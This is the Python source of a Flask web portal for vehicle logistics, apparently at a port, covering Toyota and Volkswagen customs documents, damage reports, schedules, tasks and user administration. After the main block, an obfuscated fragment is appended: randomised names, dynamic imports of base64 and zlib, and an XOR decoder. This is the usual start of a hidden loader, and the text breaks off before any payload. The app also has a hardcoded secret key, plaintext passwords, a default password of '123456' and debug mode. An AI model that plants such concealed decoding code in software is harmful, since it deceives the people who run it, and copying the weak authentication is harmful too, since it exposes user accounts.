from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify, send_file
import io
from functools import wraps
import os
import datetime
import uuid
import json
# from vw_utils import VWHSExtractor # Removed legacy
from hs_utils import HSCodeExtractor
from toyota_utils import ToyotaTrainProcessor
from vw_t2l_utils import VWAttListaHelper
from atr_utils import ATRExtractor

from toyota_t2l_utils import ToyotaAttListaHelper
from toyota_damage_utils import ToyotaDamageProcessor
from toyota_dvh_utils import ToyotaVesselDVHHelper

app = Flask(__name__)
app.secret_key = 'blg_secure_key_dev' 

def render_spa(template_name_or_list, **context):
    """
    Renders a template. If the request is from HTMX, it attempts to
    render only the 'content' block of the template by checking if
    a 'partial' version exists or by allowing the template to control logic.
    
    HOWEVER, Jinja2 block rendering from the outside is tricky without extensions.
    Strategy: 
    We will add a variable `spa_mode` to the context.
    In templates, we can use:
    {% extends "base.html" if not spa_mode else "base_partial.html" %}
    
    Or simpler:
    If HX-Request is present, we pass `spa_mode=True`.
    """
    if request.headers.get('HX-Request'):
        context['spa_mode'] = True
    return render_template(template_name_or_list, **context)

from database import db

# USERS dictionary removed in favor of database
# USERS = { ... }

@app.context_processor
def inject_utilities():
    def get_time():
        return datetime.datetime.now().strftime("%H:%M")
    return dict(get_time=get_time)

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        user = db.get_user(username)
        if user and user['password'] == password:
            # Ensure avatar exists in session
            if 'avatar' not in user: user['avatar'] = '👤'
            if 'avatar_color' not in user: user['avatar_color'] = 'var(--accent-color)'
            session['user'] = user
            # Store username explicitly for easy DB lookups later if needed
            session['username'] = username 
            return redirect(url_for('index'))
        else:
            flash('Invalid credentials')
            
    return render_spa('login.html')

@app.route('/logout')
def logout():
    session.pop('user', None)
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/api/update-avatar', methods=['POST'])
@login_required
def update_avatar():
    try:
        data = request.get_json()
        new_avatar = data.get('avatar')
        new_color = data.get('avatar_color')
        username = session.get('username')
        updates = {}
        
        if new_avatar:
            updates['avatar'] = new_avatar
        if new_color:
            updates['avatar_color'] = new_color
            
        if updates and db.update_user_settings(username, updates):
            # Update Session
            if new_avatar:
                session['user']['avatar'] = new_avatar
            if new_color:
                session['user']['avatar_color'] = new_color
            session.modified = True
            return jsonify({'success': True, 'avatar': new_avatar, 'avatar_color': new_color})
    except Exception as e:
        print(e)
    return jsonify({'success': False}), 400

@app.route('/')
@login_required
def index():
    return render_spa('index.html', user=session['user'])

# Mock route for all modules to visualize navigation
# Module Hubs Data
MODULES = {
    'toyota': ['Kamioni', 'Ladje', 'Ladijski razporedi', 'Vagoni'],
    'volkswagen': ['Ladje', 'Carinjenje', 'DVH Helper/Tools', 'Stock', 'T2L', 'Kamioni', 'A.TR Extractor', 'Tramak'],
    'vagoni': ['Sledilnik', 'Railway Agency'],
    'others': ['Docs'],
    'ecmr': ['All-in-One Tool'],
    'statistika': ['General Stats'],
    'fakture': ['Billing'],
    'produktivnost': ['Management']
}

# Detailed Module Definitions for Quick Access
ALL_MODULES_META = {
    'toyota': [
        {'id': 'toyota_vessel', 'name': 'Vessel Hub', 'icon': 'fas fa-anchor', 'url': '/toyota/vessel'},
        {'id': 'toyota_schedules', 'name': 'Ladijski razporedi', 'icon': 'fas fa-calendar-alt', 'url': '/toyota/schedules'},
        {'id': 'toyota_damage', 'name': 'Damage Report', 'icon': 'fas fa-car-crash', 'url': '/toyota/damage-report'},
        {'id': 'toyota_dvh', 'name': 'DVH Helper & DIZ', 'icon': 'fas fa-ship', 'url': '/toyota/dvh-pro'},
        {'id': 'toyota_t2l', 'name': 'T2L Helper', 'icon': 'fas fa-list-alt', 'url': '/t2l/toyota'},
        {'id': 'toyota_customs', 'name': 'Customs Helper', 'icon': 'fas fa-file-contract', 'url': '/toyota/customs'},
        {'id': 'toyota_vagoni', 'name': 'Vagoni', 'icon': 'fas fa-train', 'url': '/toyota/vagoni'},
    ],
    'volkswagen': [
        {'id': 'vw_customs', 'name': 'Customs Hub', 'icon': 'fas fa-file-contract', 'url': '/vw/carinjenje'},
        {'id': 'vw_stock', 'name': 'Stock Report', 'icon': 'fas fa-cubes', 'url': '/vw/stock'},
        {'id': 'vw_announce', 'name': 'Announcement', 'icon': 'fas fa-bullhorn', 'url': '/vw/announce'},
        {'id': 'vw_verify', 'name': 'ACAR Verification', 'icon': 'fas fa-check-double', 'url': '/vw/verify'},
        {'id': 'vw_diz', 'name': 'DIZ Splitter', 'icon': 'fas fa-project-diagram', 'url': '/vw/diz'},
        {'id': 'vw_schedules_port', 'name': 'Vozila v Luki', 'icon': 'fas fa-ship', 'url': '/vw/schedules/port'},
        {'id': 'vw_schedules_coll', 'name': 'Pobrano', 'icon': 'fas fa-truck-loading', 'url': '/vw/schedules/collected'},
        {'id': 'vw_kamioni', 'name': 'Kamioni Operations', 'icon': 'fas fa-truck', 'url': '/vw/kamioni'},
    ],
    'others': [
        {'id': 'daily_tasks', 'name': 'Daily Tasks', 'icon': 'fas fa-tasks', 'url': '/tasks'},
        {'id': 'projects', 'name': 'My Projects', 'icon': 'fas fa-layer-group', 'url': '/tasks'}, # Using same URL for now or projects
    ]
}



@app.route('/t2l/<brand>')
@login_required
def t2l(brand):
    # Normalize brand to handle case sensitivity and whitespace
    b = brand.strip().lower()
    
    if b == 'volkswagen':
        return render_spa('vw_t2l.html', user=session.get('user'))
    
    # Explicitly check for toyota variations
    if 'toyota' in b:
        return render_spa('toyota_t2l.html', user=session.get('user'))
    
    # If no match found, raise a clear 404 instead of falling back to a debug template (which shouldn't exist now)
    return f"Brand '{brand}' not found for T2L module.", 404

@app.route('/api/vw/generate-t2l', methods=['POST'])
@login_required
def api_vw_generate_t2l():
    try:
        csv_file = request.files.get('csv')
        swb_no = request.form.get('swb')
        chassis_raw = request.form.get('chassis', '')
        diz_raw = request.form.get('diz', '')

        if not csv_file or not swb_no:
             return jsonify({'error': 'Missing required fields'}), 400
        
        # Parse Lists
        vin_list = [x.strip() for x in chassis_raw.split('\n') if x.strip()]
        diz_list = [x.strip() for x in diz_raw.split('\n') if x.strip()]

        helper = VWAttListaHelper()
        data_pack = helper.load_and_process(csv_file, vin_list, diz_list, swb_no)
        
        # Generate Excel in memory
        output = helper.export_to_excel_buffer(data_pack)
        
        return send_file(
            output, 
            as_attachment=True, 
            download_name=f"ATT.LISTA {len(vin_list)}X .xlsx",
            mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
        )

    except Exception as e:
        print(f"T2L ERROR: {e}")
        return jsonify({'error': str(e)}), 500




@app.route('/api/toyota/generate-t2l', methods=['POST'])
@login_required
def api_toyota_generate_t2l():
    try:
        csv_file = request.files.get('csv')
        swb_no = request.form.get('swb')
        chassis_raw = request.form.get('chassis', '')
        diz_raw = request.form.get('diz', '')

        if not csv_file or not swb_no:
             return jsonify({'error': 'Missing required fields'}), 400
        
        # Parse Lists
        vin_list = [x.strip() for x in chassis_raw.split('\n') if x.strip()]
        diz_list = [x.strip() for x in diz_raw.split('\n') if x.strip()]

        helper = ToyotaAttListaHelper()
        data_pack = helper.load_and_process(csv_file, vin_list, diz_list, swb_no)
        
        # Generate Excel in memory
        output = helper.export_to_excel_buffer(data_pack)
        
        return send_file(
            output, 
            as_attachment=True, 
            download_name=f"ATT.LISTA {len(vin_list)}X (TOYOTA).xlsx",
            mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
        )

    except Exception as e:
        print(f"TOYOTA T2L ERROR: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/toyota/customs')
@login_required
def toyota_customs():
    return render_spa('toyota_customs.html', user=session['user'])

# --- TOYOTA ROUTES (Moved Up) ---
@app.route('/toyota/vagoni')
@login_required
def toyota_vagoni():
    return render_spa('toyota_vagoni.html', user=session.get('user'))

@app.route('/toyota/damage-report')
@login_required
def toyota_damage_report():
    return render_spa('toyota_damage_report.html', user=session.get('user'))

@app.route('/toyota/dvh-helper')
@login_required
def toyota_dvh_helper():
    return render_spa('toyota_dvh_helper.html', user=session.get('user'))

@app.route('/toyota/diz-splitter')
@login_required
def toyota_diz_splitter():
    return render_spa('toyota_diz_splitter.html', user=session.get('user'))

@app.route('/toyota/vessel', endpoint='toyota_vessel_hub')
@login_required
def toyota_vessel_hub():
    return render_spa('toyota_vessel_hub.html', user=session.get('user'))

@app.route('/toyota/dvh-pro')
@login_required
def toyota_dvh_pro():
    return render_spa('toyota_dvh_pro.html', user=session.get('user'))

@app.route('/api/toyota/damage-report', methods=['POST'])
@login_required
def api_toyota_damage_report():
    try:
        if 'manifest' not in request.files or 'pdf_text' not in request.form:
             return jsonify({'error': 'Missing manifest file or PDF text'}), 400
        
        manifest = request.files['manifest']
        pdf_text = request.form['pdf_text']
        
        processor = ToyotaDamageProcessor()
        
        # 1. Process PDF Text
        damage_data = processor.process_raw_text(pdf_text)
        
        # 2. Process Manifest (Decode bytes to string for processing)
        # Assuming manifest is CSV/Excel, but `process_manifest_reorder` expects text content if CSV-like or we need a way to parsing it.
        # The user's code for `process_manifest_reorder` splits by lines and detects delimiters. 
        # This implies it works best with CSV/SSV text. 
        # However, the input is accepted as .xlsx too. 
        # If .xlsx, we might need to convert it to a textual representation or adapter the logic.
        # REVIEWING USER LOGIC: `process_manifest_reorder` takes `manifest_text`.
        # So we should probably try to read it as text.
        
        # Safe read as text
        manifest_content = manifest.read().decode('utf-8', errors='replace')
        
        # 3. Reorder & Inject
        vin_order_text = request.form.get('vin_order_text', '')
        vin_order_list = [v.strip() for v in vin_order_text.split('\n') if v.strip()] if vin_order_text else None
        
        output_rows, dmg_idx = processor.process_manifest_reorder(manifest_content, damage_data, vin_order_list=vin_order_list)
        
        # 3.1 Inject Manual Damages (if any)
        manual_damages_text = request.form.get('manual_damages_text', '')
        if manual_damages_text:
             processor.inject_manual_damages(output_rows, manual_damages_text)
        
        # 4. Generate Excel
        # processor.export_excel returns a filename (it writes to disk).
        # We want bytes. Adaptation:
        # We will use a temporary file or modify `export_excel` to write to BytesIO.
        # Since I cannot easily modify the utilities without context switching, 
        # I will hack it: write to a temp file, read bytes, delete file.
        
        temp_filename = f"temp_damage_{datetime.datetime.now().timestamp()}.xlsx"
        generated_file = processor.export_excel(output_rows, dmg_idx, temp_filename)
        
        with open(generated_file, 'rb') as f:
            file_bytes = f.read()
            
        os.remove(generated_file)
        
        return send_file(
            io.BytesIO(file_bytes),
            as_attachment=True,
            download_name="Toyota_Damage_Report.xlsx",
            mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
        )

    except Exception as e:
        print(f"DAMAGE REPORT ERROR: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/toyota/dvh-process', methods=['POST'])
@login_required
def api_toyota_dvh_process():
    try:
        master = request.files.get('master')
        ua = request.files.get('ua')
        vessel = request.form.get('vessel', 'UNKNOWN')
        eta = request.form.get('eta', '')
        
        helper = ToyotaVesselDVHHelper()
        
        # Process
        data = helper.process_manifest(master, vessel, eta, ua_path_or_obj=ua)
        
        if 'error' in data:
             return jsonify({'error': data['error']}), 400
             
        # Generate Files (We need to return multiple files to the user)
        # Strategy: Return a list of downloadable URLs or JSON with base64? 
        # Better Strategy: The frontend expects a list of results to download.
        # We can cache them or return them as base64 (if small) or create temp links.
        # Given this is a local tool, let's just generate endpoints to download them individually 
        # OR return the content in JSON (not ideal for large files)
        # OR zip them?
        
        # User prompt asked for: "Export 3 separated Excel files"
        # The frontend code I wrote awaits `{results: [{name, url}]}`
        # I need an endpoint to serve these temp files.
        
        # SIMPLIFICATION: I will encode them as Base64 Data URIs in the JSON response. 
        # It's cleaner for a single-shot response without a DB.
        
        import base64
        results = []
        
        for key in ['PL', 'CZ', 'UA']:
            buf = helper.export_excel_bytes(data.get(key), key)
            if buf:
                b64 = base64.b64encode(buf.read()).decode('utf-8')
                filename = f"{datetime.datetime.now().strftime('%Y%m%d')} - {vessel} - {key}.xlsx"
                results.append({
                    'name': filename,
                    'url': f"data:application/vnd.openxmlformats-officedocument.spreadsheetml.sheet;base64,{b64}"
                })
        
        return jsonify({'results': results})

    except Exception as e:
        print(f"DVH ERROR: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/toyota/dvh-diz', methods=['POST'])
@login_required
def api_toyota_dvh_diz():
    try:
        content = request.json.get('content', '')
        helper = ToyotaVesselDVHHelper()
        results = helper.process_diz_txt(content)
        
        # Same strategy: return objects with content
        return jsonify({'files': results, 'download_url': '#'}) # URL is dummy, frontend handles content
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/toyota/process-train', methods=['POST'])
@login_required
def api_toyota_process_train():
    try:
        odstrel = request.files.get('odstrel')
        plan = request.files.get('plan')
        is_t1 = request.form.get('isT1') == 'on'

        if not odstrel or not plan:
            return jsonify({'error': 'Missing files'}), 400

        processor = ToyotaTrainProcessor()
        # Phase 1: Merge
        df_wag = processor.process_phase_1(odstrel.read(), plan.read(), is_t1=is_t1)
        # Phase 2: Stats
        stats = processor.process_phase_2(df_wag)
        
        return jsonify(stats)

    except Exception as e:
        return jsonify({'error': str(e)}), 500

# --- TOYOTA SHIP SCHEDULES MODULE ---

SCHEDULES_FILE = 'data/toyota_schedules.json'

def load_schedules():
    if not os.path.exists(SCHEDULES_FILE): return []
    try:
        with open(SCHEDULES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except: return []

def save_schedules(data):
    with open(SCHEDULES_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)

@app.route('/toyota/schedules', endpoint='toyota_ship_schedules')
@login_required
def toyota_ship_schedules():
    return render_spa('toyota_ship_schedules.html', user=session.get('user'))

@app.route('/api/toyota/schedules', methods=['GET'])
@login_required
def api_toyota_schedules_list():
    data = load_schedules()
    # Sort by created_at desc
    data.sort(key=lambda x: x.get('created_at', ''), reverse=True)
    return jsonify(data)

@app.route('/api/toyota/schedules/upload', methods=['POST'])
@login_required
def api_toyota_schedules_upload():
    try:
        file = request.files.get('file')
        if not file: return jsonify({'error': 'No file'}), 400
        
        vessel = request.form.get('vessel', 'Unknown')
        s_type = request.form.get('type', 'General') # PL, CZ, UA
        filename = request.form.get('filename') or file.filename
        
        schedule_id = str(uuid.uuid4())
        save_dir = os.path.join('data', 'toyota_schedules')
        if not os.path.exists(save_dir): os.makedirs(save_dir)
        
        safe_name = f"{schedule_id}_{filename}"
        file_path = os.path.join(save_dir, safe_name)
        file.save(file_path)
        
        new_entry = {
            "id": schedule_id,
            "vessel": vessel,
            "type": s_type,
            "filename": filename,
            "created_at": datetime.datetime.now().isoformat(),
            "status": "active",
            "path": file_path,
            "original_filename": filename
        }
        
        schedules = load_schedules()
        schedules.append(new_entry)
        save_schedules(schedules)
        
        return jsonify({'success': True, 'entry': new_entry})
        
    except Exception as e:
        print(f"UPLOAD ERROR: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/toyota/schedules/archive', methods=['POST'])
@login_required
def api_toyota_schedules_archive():
    try:
        data = request.json
        s_id = data.get('id')
        schedules = load_schedules()
        
        for s in schedules:
            if s['id'] == s_id:
                s['status'] = 'archived'
                # Optionally add archived_at
                s['archived_at'] = datetime.datetime.now().isoformat()
                save_schedules(schedules)
                return jsonify({'success': True})
                
        return jsonify({'error': 'Schedule not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500
        
@app.route('/api/toyota/schedules/download/<s_id>')
@login_required
def api_toyota_schedules_download(s_id):
    schedules = load_schedules()
    entry = next((x for x in schedules if x['id'] == s_id), None)
    if not entry or not os.path.exists(entry['path']):
        return "File not found", 404
        
    return send_file(
        entry['path'],
        as_attachment=True,
        download_name=entry['original_filename']
    )

@app.route('/profile')
@login_required
def profile():
    return render_spa('profile.html', user=session['user'])

@app.route('/vw/stock')
@login_required
def vw_stock():
    return render_spa('vw_stock.html', user=session.get('user'))

@app.route('/vw/announce')
@login_required
def vw_announce():
    return render_spa('vw_announce.html', user=session.get('user'))

@app.route('/vw/verify')
@login_required
def vw_verify():
    return render_spa('vw_verify.html', user=session.get('user'))

@app.route('/vw/diz')
@login_required
def vw_diz():
    return render_spa('vw_diz.html', user=session.get('user'))

@app.route('/vw/carinjenje')
@login_required
def vw_carinjenje():
    # New Customs Hub (Select Tool)
    return render_spa('vw_customs_hub.html', user=session.get('user'))

@app.route('/vw/customs/atr')
@login_required
def vw_atr_tool():
    return render_spa('vw_customs_tool_atr.html', user=session.get('user'))

@app.route('/vw/customs/hs')
@login_required
def vw_hs_tool():
    return render_spa('vw_customs_tool_hs.html', user=session.get('user'))

@app.route('/vw/customs/helper')
@login_required
def vw_customs_helper_tool():
    return render_spa('vw_customs_tool_helper.html', user=session.get('user'))

@app.route('/vw/kamioni')
@login_required
def vw_kamioni_hub():
    return render_spa('vw_kamioni_hub.html', user=session.get('user'))

@app.route('/vw/dvh-helper')
@login_required
def vw_dvh_helper():
    # Placeholder for now, or new tool
    return render_spa('wip.html', user=session.get('user'), active_module='Volkswagen DVH Helper')

@app.route('/vw/atr')
@login_required
def vw_atr():
    # Redirect legacy route to new tool
    return redirect(url_for('vw_atr_tool'))

@app.route('/api/extract-atr', methods=['POST'])
@login_required
def api_extract_atr():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
        
    try:
        file_bytes = file.read()
        extractor = ATRExtractor()
        raw_text = extractor.extract_text(file_bytes, file.filename)
        data = extractor.analyze_content(raw_text)
        return jsonify({
            'filename': file.filename,
            'atr': data['atr'],
            'invoice': data['invoice']
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/extract-hs', methods=['POST'])
@login_required
def api_extract_hs():
    # New Endpoint for HS Code
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    try:
        file_bytes = file.read()
        extractor = HSCodeExtractor()
        # process_file handles ZIP or Excel seamlessly
        results = extractor.process_file(file_bytes, file.filename)
        return jsonify({'results': results})
    except Exception as e:
        print(f"HS EXTRACT ERROR: {e}")
        return jsonify({'error': str(e)}), 500



# --- VW SHIP SCHEDULES MODULE ---

VW_SCHEDULES_PORT_FILE = 'data/vw_schedules_port.json'
VW_SCHEDULES_COLLECTED_FILE = 'data/vw_schedules_collected.json'

def load_json_file(filepath):
    if not os.path.exists(filepath): return []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return json.load(f)
    except: return []

def save_json_file(filepath, data):
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)

@app.route('/vw/schedules/port')
@login_required
def vw_schedules_port():
    return render_spa('vw_schedules_port.html', user=session.get('user'))

@app.route('/vw/schedules/collected')
@login_required
def vw_schedules_collected():
    return render_spa('vw_schedules_collected.html', user=session.get('user'))

@app.route('/api/vw/schedules/port', methods=['GET', 'POST'])
@login_required
def api_vw_schedules_port():
    if request.method == 'GET':
        return jsonify(load_json_file(VW_SCHEDULES_PORT_FILE))
    if request.method == 'POST':
        try:
            data = request.json
            save_json_file(VW_SCHEDULES_PORT_FILE, data)
            return jsonify({'success': True})
        except Exception as e:
            return jsonify({'error': str(e)}), 500

@app.route('/api/vw/schedules/collected', methods=['GET', 'POST'])
@login_required
def api_vw_schedules_collected():
    if request.method == 'GET':
        return jsonify(load_json_file(VW_SCHEDULES_COLLECTED_FILE))
    if request.method == 'POST':
        try:
            data = request.json
            save_json_file(VW_SCHEDULES_COLLECTED_FILE, data)
            return jsonify({'success': True})
        except Exception as e:
            return jsonify({'error': str(e)}), 500


# Generic Hub Route
@app.route('/hub/<name>')
@login_required
def hub(name):
    # Custom dashboard for Volkswagen
    if name.lower() == 'volkswagen':
         return render_spa('vw_hub.html', user=session['user'])
    # Custom dashboard for Toyota
    if name.lower() == 'toyota':
         return render_spa('toyota_hub.html', user=session['user'])

    # Generic Hub Logic
    raw_submodules = MODULES.get(name.lower(), [])
    
    # Define Route Mapping for Submodules
    SUBMODULE_ROUTES = {
        ('volkswagen', 'Carinjenje'): 'vw_carinjenje',
        ('toyota', 'Carinjenje'): 'toyota_customs',
        ('volkswagen', 'Stock'): 'vw_stock',
        ('volkswagen', 'A.TR Extractor'): 'vw_atr',
        ('volkswagen', 'T2L'): 't2l',
        ('toyota', 'T2L'): 't2l',
        ('toyota', 'Vagoni'): 'toyota_vagoni',
        ('toyota', 'Ladje'): 'toyota_damage_report',
        ('toyota', 'Ladijski razporedi'): 'toyota_ship_schedules',
        ('volkswagen', 'Kamioni'): 'vw_kamioni_hub', # Updated to point to new default
    }
    
    submodules = []
    for sub in raw_submodules:
        endpoint = SUBMODULE_ROUTES.get((name.lower(), sub))
        
        # Heuristic fallbacks if no mapping
        if not endpoint:
            if 'Customs' in sub: endpoint = f'{name.lower()}_customs'
            else: endpoint = 'wip'
            
        if endpoint == 't2l':
            url = url_for(endpoint, brand=name)
        else:
            url = url_for(endpoint) if endpoint != 'wip' else url_for('wip')
        
        submodules.append({
            'name': sub,
            'url': url,
            'icon': 'folder' 
        })
        
    return render_spa('hub.html', module_name=name.capitalize(), submodules=submodules, user=session['user'])

@app.route('/wip')
def wip():
    return render_spa('wip.html', user=session.get('user'))

@app.route('/module/<path:subpath>')
@login_required
def module_view(subpath):
    return render_spa('wip.html', active_module=subpath, user=session.get('user'))

@app.route('/api/user/settings', methods=['GET', 'POST'])
@login_required
def user_settings():
    if request.method == 'GET':
        username = session.get('username')
        user = db.get_user(username)
        return jsonify({
            'dashboard_layout': user.get('dashboard_layout', []),
            'visible_modules': user.get('visible_modules', []),
            'quick_access': user.get('quick_access', [])
        })
    
    if request.method == 'POST':
        try:
            data = request.json
            username = session.get('username')
            updates = {}
            if 'dashboard_layout' in data:
                updates['dashboard_layout'] = data['dashboard_layout']
            
            if 'quick_access' in data:
                updates['quick_access'] = data['quick_access']
            
            if db.update_user_settings(username, updates):
                return jsonify({'success': True})
            return jsonify({'success': False, 'error': 'Failed to save'}), 500
        except Exception as e:
             return jsonify({'success': False, 'error': str(e)}), 500

# --- ADMIN MODULE ---
@app.route('/admin/users')
@login_required
def admin_users():
    if session['user'].get('role') != 'admin':
        return redirect(url_for('index'))
    users = db.load_users()
    return render_spa('admin_users.html', user=session['user'], all_users=users)

@app.route('/api/admin/user', methods=['POST', 'DELETE'])
@login_required
def api_admin_user():
    if session['user'].get('role') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403
    
    if request.method == 'POST':
        data = request.json
        username = data.get('username')
        if not username: return jsonify({'error': 'Username required'}), 400
        
        user_data = {
            'username': username, # Add username to dict for convenience
            'password': data.get('password', '123456'),
            'role': data.get('role', 'user'),
            'name': data.get('name', username),
            'avatar': '👤',
            'visible_modules': data.get('visible_modules', ['Toyota', 'Volkswagen']),
            'dashboard_layout': ['kpi_stock']
        }
        if db.add_user(username, user_data):
            return jsonify({'success': True})
        return jsonify({'error': 'User already exists'}), 400

    if request.method == 'DELETE':
        username = request.args.get('username')
        if username == 'admin':
             return jsonify({'error': 'Cannot delete super admin'}), 400
        if db.delete_user(username):
             return jsonify({'success': True})
        return jsonify({'error': 'User not found'}), 404
        
# --- DAILY TASKS MODULE ---
@app.route('/tasks')
@login_required
def daily_tasks():
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    return render_spa('daily_tasks.html', user=session['user'], date=today)

@app.route('/api/tasks', methods=['GET', 'POST', 'PUT', 'DELETE'])
@login_required
def api_tasks():
    username = session['username']
    
    if request.method == 'GET':
        date = request.args.get('date', datetime.datetime.now().strftime("%Y-%m-%d"))
        tasks = db.get_user_tasks(username, date)
        return jsonify(tasks)
        
    if request.method == 'POST':
        data = request.json
        title = data.get('title')
        date = data.get('date', datetime.datetime.now().strftime("%Y-%m-%d"))
        if not title: return jsonify({'error': 'Title required'}), 400
        new_task = db.add_task(username, title, date)
        return jsonify(new_task)
        
    if request.method == 'PUT':
        data = request.json
        task_id = data.get('id')
        completed = data.get('completed')
        if db.update_task_status(task_id, completed):
            return jsonify({'success': True})
        return jsonify({'error': 'Task not found'}), 404
        
    if request.method == 'DELETE':
        task_id = request.args.get('id')
        if db.delete_task(task_id):
            return jsonify({'success': True})
        return jsonify({'error': 'Task not found'}), 404

# --- ADMIN PRODUCTIVITY ---
@app.route('/admin/productivity')
@login_required
def admin_productivity():
    if session['user'].get('role') != 'admin':
        return redirect(url_for('index'))
    return render_spa('admin_productivity.html', user=session['user'])

@app.route('/api/admin/all_tasks')
@login_required
def api_admin_all_tasks():
    if session['user'].get('role') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403
    date = request.args.get('date', datetime.datetime.now().strftime("%Y-%m-%d"))
    tasks = db.get_all_tasks_by_date(date)
    return jsonify(tasks)

# --- PROJECTS MODULE ---
@app.route('/projects/board')
@login_required
def projects_board():
    users = db.load_users()
    return render_spa('projects_board.html', user=session['user'], users=users)

@app.route('/admin/projects/history')
@login_required
def projects_history():
    if session['user'].get('role') != 'admin':
        return redirect(url_for('index'))
    return render_spa('projects_archive.html', user=session['user'])

def sync_project_to_tasks(project):
    """
    Synchronizes project assignments and status to Daily Tasks.
    """
    pid = project['id']
    title = project['title']
    category = project.get('category', 'Others')
    status = project['status']
    assignees = project.get('assignees', [])
    is_completed = (status == 'done')
    
    # Get all tasks linked to this project
    existing_tasks = db.get_tasks_by_project(pid)
    existing_map = {t['username']: t for t in existing_tasks}
    
    today = datetime.datetime.now().strftime("%Y-%m-%d")

    # 1. Handle current assignees
    for user in assignees:
        # Format: [Category] Title
        task_title = f"[{category}] {title}"
        
        if user in existing_map:
            # Update existing task
            task = existing_map[user]
            updates = {}
            if task.get('completed') != is_completed:
                updates['completed'] = is_completed
            if task.get('title') != task_title:
                updates['title'] = task_title
            
            if updates:
                db.update_task(task['id'], updates)
                
        else:
            # Create new task
            new_task = db.add_task(user, task_title, today, project_id=pid)
            if is_completed:
                db.update_task(new_task['id'], {'completed': True})

    # 2. Handle removed assignees
    for user, task in existing_map.items():
        if user not in assignees:
            db.delete_task(task['id'])

@app.route('/api/projects', methods=['GET', 'POST', 'PUT', 'DELETE'])
@login_required
def api_projects():
    if request.method == 'GET':
        projects = db.get_projects()
        # Clean data for deleted users? No, better keep history.
        return jsonify(projects)
        
    if request.method == 'POST':
        data = request.json
        new_project = {
            'id': str(datetime.datetime.now().timestamp()),
            'title': data.get('title'),
            'category': data.get('category', 'Others'),
            'description': data.get('description', ''),
            'status': 'todo', # todo, in_progress, on_hold, done
            'assignees': data.get('assignees', []),
            'due_date': data.get('due_date', ''),
            'created_by': session['username'],
            'created_at': datetime.datetime.now().isoformat(),
            'archived': False
        }
        db.save_project(new_project)
        sync_project_to_tasks(new_project)
        return jsonify(new_project)

    if request.method == 'PUT':
        data = request.json
        project_id = data.get('id')
        project = db.get_project(project_id)
        if not project:
            return jsonify({'error': 'Project not found'}), 404
            
        # Update allowed fields
        if 'status' in data: project['status'] = data['status']
        if 'title' in data: project['title'] = data['title']
        if 'category' in data: project['category'] = data['category']
        if 'description' in data: project['description'] = data['description']
        if 'assignees' in data: project['assignees'] = data['assignees']
        if 'due_date' in data: project['due_date'] = data['due_date']
        if 'checklist' in data: project['checklist'] = data['checklist']
        if 'archived' in data: 
            project['archived'] = data['archived']
            if data['archived']: project['archived_at'] = datetime.datetime.now().isoformat()
            
        db.save_project(project)
        sync_project_to_tasks(project)
        return jsonify({'success': True})
        
    if request.method == 'DELETE':
        project_id = request.args.get('id')
        if db.delete_project(project_id):
            return jsonify({'success': True})
        return jsonify({'error': 'Not found'}), 404


@app.route('/api/modules', methods=['GET'])
@login_required
def api_all_modules():
    return jsonify(ALL_MODULES_META)

if __name__ == '__main__':
    # Print map for debugging if needed
    # print(app.url_map)
    app.run(debug=True, use_reloader=True, port=5000)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
